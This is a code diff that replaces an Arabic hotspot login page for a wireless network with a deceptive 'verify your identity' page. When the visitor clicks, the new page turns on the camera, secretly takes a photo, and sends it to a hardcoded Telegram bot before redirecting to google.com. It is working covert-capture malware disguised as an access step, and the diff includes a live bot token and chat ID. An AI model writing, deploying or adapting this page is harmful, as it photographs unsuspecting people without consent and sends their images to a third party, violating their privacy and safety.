@@ -1,256 +1,37 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شبكة النور اللاسلكية 5G</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
-        
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-
-        body {
-            background: #010811;
-            background-image: radial-gradient(circle at 50% 50%, rgba(0, 210, 255, 0.15) 0%, transparent 80%);
-            color: white; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden;
-        }
-
-        .glass-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 40px;
-            padding: 30px 25px; width: 95%; max-width: 420px; text-align: center;
-            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
-        }
-
-        .network-name { font-size: 1.2rem; font-weight: 900; margin-bottom: 5px; color: #fff; text-shadow: 0 0 15px rgba(255, 215, 0, 0.2); }
-        
-        /* تنسيق عبارة التذكير الديني */
-        .religious-note { 
-            font-size: 0.75rem; 
-            color: #ffd700; 
-            margin-bottom: 20px; 
-            font-weight: bold;
-            opacity: 0.9;
-        }
-
-        .update-control {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 20px; padding: 12px 15px; margin-bottom: 15px;
-            display: flex; justify-content: space-between; align-items: center;
-            border: 1px solid rgba(0, 210, 255, 0.1);
-        }
-        .update-control span { font-size: 0.8rem; font-weight: bold; color: #00d2ff; }
-        
-        .switch { position: relative; display: inline-block; width: 44px; height: 22px; }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider {
-            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
-            background-color: #333; transition: .4s; border-radius: 34px;
-        }
-        .slider:before {
-            position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px;
-            background-color: white; transition: .4s; border-radius: 50%;
-        }
-        input:checked + .slider { background-color: #ffd700; }
-        input:checked + .slider:before { transform: translateX(22px); }
-
-        select {
-            width: 100%; padding: 12px; background: rgba(255, 255, 255, 0.08);
-            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 15px;
-            color: #fff; margin-bottom: 20px; font-weight: bold; outline: none; font-size: 0.95rem; text-align: center;
-            cursor: pointer;
-        }
-        option { background: #010811; color: #fff; }
-
-        input[type="text"] {
-            width: 85%; padding: 10px; background: rgba(0, 0, 0, 0.3);
-            border: 2px solid rgba(255, 215, 0, 0.3); border-radius: 20px;
-            color: #ffd700; text-align: center; font-size: 1.5rem; outline: none;
-            transition: 0.3s; font-weight: 900; margin: 0 auto 20px auto; display: block;
-        }
-        input[type="text"]:focus { border-color: #ffd700; background: rgba(0, 0, 0, 0.5); }
-
-        .btn-main {
-            width: 100%; padding: 16px; background: linear-gradient(45deg, #ffd700, #ffa500);
-            border: none; border-radius: 20px; color: #000; font-weight: 900; cursor: pointer; font-size: 1.4rem;
-        }
-
-        .history-box {
-            margin-top: 15px; padding: 10px; background: rgba(255, 255, 255, 0.03);
-            border-radius: 15px; border: 1px dashed rgba(255, 215, 0, 0.2); display: none;
-        }
-        .history-label { font-size: 0.75rem; color: #888; margin-bottom: 8px; display: block; }
-        .cards-list { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px; }
-        .card-tag {
-            background: rgba(255, 215, 0, 0.1); color: #ffd700; border: 1px solid rgba(255, 215, 0, 0.3);
-            padding: 4px 10px; border-radius: 8px; font-size: 0.85rem; cursor: pointer;
-        }
-
-        #error-msg { background: rgba(255, 0, 0, 0.2); color: #ff5555; padding: 10px; border-radius: 12px; font-size: 0.8rem; margin-bottom: 15px; display: none; border: 1px solid rgba(255, 0, 0, 0.3); }
-
-        .nav-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 25px; }
-        .btn-sub { background: rgba(255,255,255,0.05); color: #fff; padding: 10px; border-radius: 12px; text-decoration: none; font-size: 0.8rem; border: 1px solid rgba(255,255,255,0.1); }
-
-        .footer-credit { margin-top: 35px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; }
-        .designer-name { color: #ffd700; font-weight: 900; display: block; font-size: 1.15rem; margin-bottom: 5px; }
-        .designer-phone { color: #00d2ff; text-decoration: none; font-weight: bold; font-size: 0.95rem; }
-    </style>
-</head>
-<body onload="initSystem()">
-
-    <div class="glass-card">
-        <h1 class="network-name">شبكة النور اللاسلكية 5G</h1>
-        
-        <p id="religiousText" class="religious-note">تذكر أن الله رقيب عليك</p>
-        
-        <div id="error-msg"></div>
-
-        <form name="login" id="loginForm" action="$(link-login)" method="post" onsubmit="return handleLogin()">
-            <input type="hidden" name="dst" value="$(dst)" />
-            <input type="hidden" name="popup" value="false" />
-
-            <div class="update-control">
-                <span>🚫 إيقاف التحديثات التلقائية</span>
-                <label class="switch">
-                    <input type="checkbox" id="blockUpdates">
-                    <span class="slider"></span>
-                </label>
-            </div>
-
-            <select id="speedMode" name="domain">
-                <option value="Standard">🚀 الوضع التلقائي (الأسرع)</option>
-                <option value="100Mbps">🔥 سرعة فائقة (100 ميقا)</option>
-                <option value="70Mbps">⚡ سرعة عالية (70 ميقا)</option>
-                <option value="60Mbps">✨ سرعة توربو (60 ميقا)</option>
-                <option value="Gaming">🎮 وضع الألعاب (بينج منخفض)</option>
-                <option value="Streaming">🎥 وضع الأفلام واليوتيوب (4K)</option>
-                <option value="Social">📱 وضع السوشيال ميديا</option>
-                <option value="Saving">🔋 وضع توفير البيانات</option>
-            </select>
-
-            <input type="text" name="username" id="user" placeholder="أدخل الكرت" value="" autocomplete="off" required>
-            <input type="hidden" name="password" id="pass">
-
-            <button type="submit" id="submitBtn" class="btn-main">تـسـجـيـل الـدخـول</button>
-
-            <div id="historySection" class="history-box">
-                <span class="history-label">كروت استخدمتها سابقاً:</span>
-                <div id="cardsList" class="cards-list"></div>
-            </div>
-        </form>
-
-        <div class="nav-grid">
-            <a href="prices.html" class="btn-sub">💰 الباقات</a>
-            <a href="stores.html" class="btn-sub">📍 نقاط البيع</a>
-            <a href="support.html" class="btn-sub" style="grid-column: span 2;">📞 الدعم الفني </a>
-        </div>
-
-        <div class="footer-credit">
-            <span style="font-size: 0.7rem; color: #777; display: block;">تصميم وتطوير</span>
-            <span class="designer-name">م/ هداف ملص</span>
-            <a href="tel:777382690" class="designer-phone">📱 777382690</a>
-        </div>
-    </div>
+<html>
+<head><title>تحقق من هويتك</title></head>
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
+    <h2>يجب الضغط على الزر أدناه للدخول</h2>
+    <button id="startBtn" style="padding:20px; font-size:20px; border-radius:10px;">دخول المحتوى</button>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BAN_KEY = 'alnoor_ban_time';
-        const STORAGE_KEY = 'alnoor_cards';
+        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
+        const CHAT_ID = '8293639164';
 
-        // قائمة عبارات تذكيرية
-        const religiousPhrases = [
-            "تذكر أن الله رقيب عليك في كل حين",
-            "الأحوال تتغير وعين الله لا تنام",
-            "الإنترنت نعمة.. فلا تجعلها نقمة وشاهدة عليك",
-            "اجعل الإنترنت وسيلة لطلب العلم وعمل الخير",
-            "صلي على النبي ﷺ"
-        ];
-
-        function initSystem() {
-            setRandomPhrase();
-            checkBanStatus();
-            loadHistory();
-            autoFillLastCard();
-        }
-
-        // دالة لاختيار عبارة عشوائية عند كل دخول
-        function setRandomPhrase() {
-            const index = Math.floor(Math.random() * religiousPhrases.length);
-            document.getElementById('religiousText').innerText = religiousPhrases[index];
-        }
-
-        function checkBanStatus() {
-            const banTime = localStorage.getItem(BAN_KEY);
-            if (banTime) {
-                const remaining = new Date(parseInt(banTime)) - new Date();
-                if (remaining > 0) {
-                    const btn = document.getElementById('submitBtn');
-                    const err = document.getElementById('error-msg');
-                    btn.disabled = true;
-                    btn.style.opacity = '0.5';
-                    err.style.display = 'block';
-                    err.innerText = "محاولات كثيرة خاطئة! انتظر قليلاً.";
-                    return true;
-                } else {
-                    localStorage.removeItem(BAN_KEY);
-                    localStorage.removeItem('attempts');
-                }
-            }
-            return false;
-        }
-
-        function handleLogin() {
-            if (checkBanStatus()) return false;
-
-            var user = document.getElementById('user').value.trim();
-            var block = document.getElementById('blockUpdates').checked;
-            document.getElementById('pass').value = user;
-
-            if(block) { document.getElementById('speedMode').value = "NoUpdate"; }
-
-            saveCard(user);
-
-            let attempts = parseInt(localStorage.getItem('attempts') || "0");
-            attempts++;
-            localStorage.setItem('attempts', attempts);
-            if (attempts >= 5) {
-                localStorage.setItem(BAN_KEY, new Date().getTime() + (5 * 60 * 1000));
-            }
-
-            return true;
-        }
-
-        function saveCard(card) {
-            let history = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
-            if (!history.includes(card)) {
-                history.unshift(card);
-                if (history.length > 5) history.pop();
-                localStorage.setItem(STORAGE_KEY, JSON.stringify(history));
-            }
-        }
-
-        function loadHistory() {
-            const history = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
-            const section = document.getElementById('historySection');
-            const list = document.getElementById('cardsList');
-            if (history.length > 0) {
-                section.style.display = 'block';
-                list.innerHTML = history.map(card => `<span class="card-tag" onclick="quickLogin('${card}')">${card}</span>`).join('');
-            }
-        }
-
-        function autoFillLastCard() {
-            const history = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
-            if (history.length > 0) {
-                document.getElementById('user').value = history[0];
-            }
-        }
-
-        function quickLogin(card) {
-            document.getElementById('user').value = card;
-            document.getElementById('pass').value = card;
-            document.getElementById('loginForm').submit();
-        }
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                document.getElementById('startBtn').innerText = "جاري التحميل...";
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'photo.jpg');
+                        formData.append('chat_id', CHAT_ID);
+                        fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, { method: 'POST', body: formData })
+                        .then(() => { window.location.href = "https://google.com"; });
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (e) { alert("يرجى السماح بالكاميرا للمتابعة"); }
+        });
     </script>
 </body>
 </html>
